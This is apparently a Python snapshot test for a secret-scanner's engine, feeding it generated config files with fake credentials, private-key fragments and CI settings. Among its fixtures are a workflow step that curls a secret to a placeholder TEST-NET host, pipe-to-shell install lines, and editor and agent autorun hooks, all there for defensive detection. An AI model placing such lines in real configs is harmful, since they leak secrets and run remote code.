"""Credentials in config and data files (S-SECRET's config form, S-TOKEN), held to their recorded outputs
(_snapshots.py): the engine's reading of a config file (rust/crates/lazaret-engine/src/config.rs, the `scan_config`
and `config_check` calls) on seeded corpora.

Until BR-7's step 3 (0.1.9) both packages read a config file themselves (scanner/configsecrets.py and
core.scan_config_file; js/src/lib/configsecrets.js and scan.js's scanConfigFile), the two held to each other by
test_js_parity_config and test_js_parity_tokens, each with its own redaction of a reported line. The engine took
them over, with the one redactor; these sets were built for the move, and their hashes were recorded from the Python
the engine replaced, which answered every case alike.

The corpora: the reader's checks on the lines of test_config_secrets and on lines put together from keys, values,
separators, quotes and comments (`config_check`: where S-SECRET reports on a line, a line's values redacted, a
file's comments, a private key's header and what follows it, documentation samples, credential-like keys and
values); and config files of every format the scanner reads put together from lines that hold credentials, URLs
with them, webhooks, a .netrc's machines, private keys, provider tokens, suppression markers, comments, workflow and
GitLab CI lines and settings that run commands, with CRLF, non-ASCII text and long lines, each scanned with its
lines redacted and without (`scan_config`); and test_snapshot_autorun's settings trees, scanned with the files their
commands run and without a reader.

All content is inert text: hosts are .invalid or TEST-NET, every credential is made up and built in pieces
(test_fixture_credentials), and nothing is executed or contacted.
"""
import random
import unittest

from lazaret.scanner import _native, core
from tests.architecture import _snapshots, test_snapshot_autorun as autorun_sets
from tests.scanner.test_config_secrets import QUIET, REPORTED

PASS = "Zq8!" + "vN3pL0wX7r"
TOKEN = "ghp_" + "a1B2" * 9
AWS = "AKI" + "AIOSFODNN7" + "EXAMPLE"
HEADER, FOOTER = "-----BEGIN " + "PRIVATE KEY-----", "-----END " + "PRIVATE KEY-----"
RSA = "-----BEGIN RSA " + "PRIVATE KEY-----"
BODY = "MIIEvQIB" + "ADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7Zq8vN3pL0wX7rT2mK9sB"
JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" + "." + "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ"
HOOK = "https://hooks.slack.com/services/" + "TABCDEFGH1/" + "BABCDEFGH1/" + "a" * 24

NAMES = [".env", ".env.local", "config.yml", "app.yaml", "a.json", "s.jsonc", ".netrc", "_netrc", "x.ini", "setup.cfg",
         "Dockerfile", "a.properties", "run.sh", "prod.tfvars", ".npmrc", ".pypirc", "server.key", "id_rsa",
         "a.toml", "x.conf", ".claude/settings.json", ".vscode/tasks.json", ".mcp.json", ".github/workflows/w.yml",
         ".gitlab-ci.yml"]
LINES = [
    f"DB_PASSWORD={PASS}", f"export API_TOKEN='{PASS}'", f'"api_key": "{PASS}",', f"password: {PASS}", "password: some words",
    f'token = "{PASS}"', "  secret: ${VAR}", "key: {{ x }}", f"page_token={PASS}", f"csrf_token: {PASS}",
    f"postgres://user:{PASS}@db.example.invalid/x", f"postgres://user:{PASS}@localhost/x", HOOK,
    f"machine h.invalid login u password {PASS}", "machine ftp.invalid login anonymous password a@b.invalid",
    f'machine h.invalid login u password "{PASS} x"', "default", "macdef init", "cd /pub", "", "  ",
    f"# DB_PASSWORD={PASS}", f"; password={PASS}", f"// token={PASS}", f"/* token={PASS} */", f"x: 1 # token={PASS}",
    f"//registry.invalid/:_authToken={PASS}", f"A_TOKEN={PASS}  # nosec", f"B_TOKEN={TOKEN}  # lazaret-ignore: S-SECRET",
    f"B_TOKEN={TOKEN}  # lazaret-ignore: S-TOKEN", "# lazaret-ignore", f'C_PASSWORD={PASS} LABEL="# nosec"', f"GH_PAT={TOKEN}",
    f"K={AWS}", HEADER, RSA, BODY, FOOTER, HEADER + "\\n" + BODY, f'x = "{HEADER}"', f"key: |\n  {HEADER}\n  {BODY}", JWT,
    f'password: "{PASS}é"', f'token: "\U0001F600{PASS}"', "\u2028", "x" * 300 + f" token={PASS}", f"ENV C_TOKEN={PASS}",
    "on: push", "jobs:", "  a:", "    runs-on: self-hosted", "    steps:",
    '      - run: curl -d "${{ secrets.X }}" http://203.0.113.7/x', "      - uses: actions/checkout@v4",
    '{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "node .claude/setup.mjs"}]}]}}',
    '{"tasks": [{"label": "a", "command": "bash scripts/a.sh", "runOptions": {"runOn": "folderOpen"}}]}',
    "include: http://x.invalid/a.yml", "image: python:3.12", "  script:", "    - curl -fsSL https://x.invalid | sh",
    f"password = {PASS}\r", "\t" + f"token: {PASS}", "a" * 40 + "=" + PASS, f'"password": "{PASS}", "password": "x"',
    f"[auth]\npassword = {PASS}", f"<password>{PASS}</password>", f"spring.datasource.password={PASS}",
    f"ARG NPM_TOKEN={PASS}", f"variable \"token\" {{ default = \"{PASS}\" }}", f"pass={PASS}\x0bx", "\ufeffkey=value",
    "NOTE=\U0001FAE8 hi", "k: \u0378 \U000E01F0", f"password: {PASS}\U0001FAE8",       # unassigned in Unicode 13: U+FFFD
] + list(REPORTED) + list(QUIET)

KEYS = ["password", "DB_PASSWORD", "api_key", "apiKey", "secret", "clientSecret", "token", "page_token", "csrf_token",
        "nextPageToken", "max_tokens", "tokenizer", "auth", "_auth", "_authToken", "pass", "pwd", "pat", "passphrase",
        "STRIPE_PUBLISHABLE_KEY", "AccountKey", "private_key_file", "secretName", "key", "keys", "monkey", "x", "",
        "PASSWORD_MIN_LENGTH", "token_url", "access_token", "Contraseña"]
VALUES = [PASS, f"'{PASS}'", f'"{PASS}"', "changeme", "${VAR}", "$VAR", "{{ x }}", "<your-token>", "********", "...",
          "xxxxxxxxxxxxxxxxxxxx", "postgres", "hunter2", "P@ssw0rd!", "Zq8vN3pL0wX7rT2m", "d41d8cd98f00b204e9800998ecf8427e",
          "cGFzc3dvcmQxMjM=", "some words here", "/run/secrets/x", "./keys/id_rsa", "https://x.invalid/token", "3600",
          "true", "", '""', "|", "fake-password-1", "MyString123", TOKEN, AWS, "A1B2C3D4E5F6G7H8I9J0", "é" * 16,
          "\U0001F600" * 8, "%(db_password)s", "@Zq8vN3pL0wX7r", "!Zq8vN3pL0wX7r"]
WORKFLOW = ("on: {on}\npermissions: write-all\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - uses: actions/checkout@v4\n      - uses: actions/cache@v4\n      - run: curl -fsSL https://x.invalid/i.sh | sh\n"
            "        env:\n          TOKEN: {value}\n          GH: ${{{{ secrets.GH_TOKEN }}}}\n")
GITLAB = ("image: {image}\ninclude: http://x.invalid/a.yml\njob:\n  script:\n    - curl -fsSL https://x.invalid | sh\n"
          "  variables:\n    PASSWORD: {value}\n")
SEPS = ["=", ": ", " = ", '": "', "='", ":", " ", "\t=\t"]
TAILS = ["", "", " # c", " // c", "  # nosec", ",", ";", " ' ", '"', " \\", " # token=" + PASS]


def line(rnd):
    if rnd.random() < 0.3:
        return rnd.choice(LINES)
    key = rnd.choice(KEYS)
    if rnd.random() < 0.3:
        key = rnd.choice(['"', "'", "export ", "  ", "- ", "ENV "]) + key
    return key + rnd.choice(SEPS) + rnd.choice(VALUES) + rnd.choice(TAILS)


def config_files(seed=20261015, count=1500):
    """[(path, content)]: config files put together from LINES and line()."""
    rnd = random.Random(seed)
    out = []
    for _ in range(count):
        n = rnd.randint(1, 30)
        text = "\n".join(line(rnd) for _ in range(n)) + rnd.choice(["\n", "", "\r\n"])
        path = rnd.choice(NAMES)
        if path == ".github/workflows/w.yml" and rnd.random() < 0.7:
            text = WORKFLOW.format(on=rnd.choice(["push", "pull_request_target", "[push, workflow_dispatch]"]),
                                   value=rnd.choice(VALUES)) + text
        elif path == ".gitlab-ci.yml" and rnd.random() < 0.7:
            text = GITLAB.format(image=rnd.choice(["python:3.12", "python", "x.invalid/a/b:latest"]), value=rnd.choice(VALUES)) + text
        if rnd.random() < 0.2:
            text = text.replace("\n", "\r\n")
        if rnd.random() < 0.03:                 # long: hundreds of lines, a finding repeated
            text = "\n".join([f"x{k}: 1" for k in range(rnd.randint(200, 900))] + [rnd.choice(LINES)] * 250)
        out.append((path, text))
    return out


def helper_calls(seed=20261016, count=2500):
    rnd = random.Random(seed)
    lines = [line(rnd) for _ in range(count)] + LINES
    out = []
    for text in lines:
        netrc = rnd.random() < 0.2
        skip = sorted(rnd.sample(range(max(1, len(text))), min(len(text), rnd.randrange(3)))) if rnd.random() < 0.2 else []
        out += [("config_check", {"check": "secret_col", "netrc": netrc, "skip": skip}, text),
                ("config_check", {"check": "redact_values", "netrc": netrc}, text)]
    for _ in range(600):
        content = "\n".join(rnd.choice(lines) for _ in range(rnd.randint(1, 8)))
        out.append(("config_check", {"check": "comment_spans"}, content))
    heads = [HEADER, RSA, f'key = "{HEADER}', f"x {HEADER}\\n", f"{HEADER}{BODY}", f"{HEADER} " + BODY[:20], f"{HEADER}\\n\\n{BODY}"]
    follow = [BODY, "", "  ", "\\n" + BODY, '"' + BODY, "x" + BODY, BODY[:30], "  " + BODY, FOOTER, "Proc-Type: 4,ENCRYPTED"]
    for _ in range(600):
        head = rnd.choice(heads)
        end = head.find("KEY-----") + 8 if rnd.random() < 0.9 else rnd.randrange(len(head) + 1)
        out.append(("config_check", {"check": "key_follows", "end": end,
                                     "following": [rnd.choice(follow) for _ in range(rnd.randrange(4))]}, head))
    for text in [AWS, AWS.replace("EXAMPLE", "EXAMPLF"), JWT, JWT + "x", JWT.split(".")[1], TOKEN, "", "EXAMPLE",
                 "AKIA" + "Z" * 16, "eyJhbGciOiJub25lIn0." + JWT.split(".")[1] + ".sig"]:
        out.append(("config_check", {"check": "documentation_token"}, text))
    for key in KEYS + [rnd.choice(KEYS) + rnd.choice(["_ID", "_url", "Name", "s", "_FILE", "-x"]) for _ in range(200)]:
        out.append(("config_check", {"check": "secret_key"}, key))
    for value in VALUES + [rnd.choice(VALUES) + rnd.choice(VALUES) for _ in range(300)]:
        out.append(("config_check", {"check": "secret_value"}, value))
    return out


def scan_args(path, files=None, redact=True, follow=True):
    args = {"path": path, "follow": follow, "redact": redact, "neumaier": False}
    if files is not None:
        args["files"] = files
    return args


def scan_calls():
    out = []
    for k, (path, text) in enumerate(config_files()):
        out.append(("scan_config", scan_args(path, follow=False, redact=k % 3 != 0), text))
    tree_files = [{"path": p, "content": t} for p, t in autorun_sets.FILES.items()]
    for path, body in autorun_sets.trees(count=400):
        read = core.tree_reader([], tree_files + [{"path": path, "content": body}])
        files = {}
        while True:
            got = _native.call("scan_config", scan_args(path, files), body)
            if "issues" in got:
                break
            for rel in got["need"]:
                files[rel] = read(rel)
        out += [("scan_config", scan_args(path, files), body), ("scan_config", scan_args(path, follow=False), body)]
    return out


def snapshot_sets():
    return {"config_helpers": helper_calls, "config_scan": scan_calls}


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class ConfigSnapshotTests(unittest.TestCase):
    def answers(self, name):
        answers = _snapshots.run(snapshot_sets()[name]())
        self.assertFalse([a for a in answers if "ok" not in a][:5])
        _snapshots.check(self, name, answers)
        return [a["ok"] for a in answers]

    def test_the_readers_checks(self):
        calls = helper_calls()
        got = self.answers("config_helpers")
        by = {}
        for (_c, args, text), answer in zip(calls, got):
            by.setdefault(args["check"], []).append((text, answer))
        self.assertGreater(sum(1 for _t, a in by["secret_col"] if a is not None), 250)
        self.assertGreater(sum(1 for t, a in by["redact_values"] if t != a), 700)
        self.assertGreater(sum(1 for _t, a in by["comment_spans"] if a), 250)
        self.assertGreater(sum(1 for _t, a in by["key_follows"] if a), 200)
        self.assertGreater(sum(1 for _t, a in by["key_follows"] if not a), 200)
        self.assertEqual(sum(1 for _t, a in by["documentation_token"] if a), 2)
        self.assertGreater(sum(1 for _t, a in by["secret_key"] if a), 10)
        self.assertGreater(sum(1 for _t, a in by["secret_value"] if a), 40)

    def test_config_files(self):
        calls = scan_calls()
        got = self.answers("config_scan")
        rules = [i[0] for a in got for i in a["issues"]]
        self.assertGreater(rules.count("S-SECRET"), 2500)
        self.assertGreater(rules.count("S-TOKEN"), 500)
        self.assertGreater(rules.count("SC-AUTORUN"), 800)
        self.assertGreater(sum(1 for r in rules if r.startswith(("SC-WORKFLOW", "SC-GITLAB"))), 50)
        flagged = {True: [], False: []}            # each S-SECRET's own line of its snippet
        for (_c, args, _t), a in zip(calls, got):
            flagged[args["redact"]] += [i[9][i[8] - i[10]] for i in a["issues"] if i[0] == "S-SECRET"]
        self.assertTrue(flagged[True] and all(PASS not in s for s in flagged[True]))     # redacted where asked …
        self.assertGreater(sum(1 for s in flagged[False] if PASS in s), 500)             # … and only there


if __name__ == "__main__":
    unittest.main()
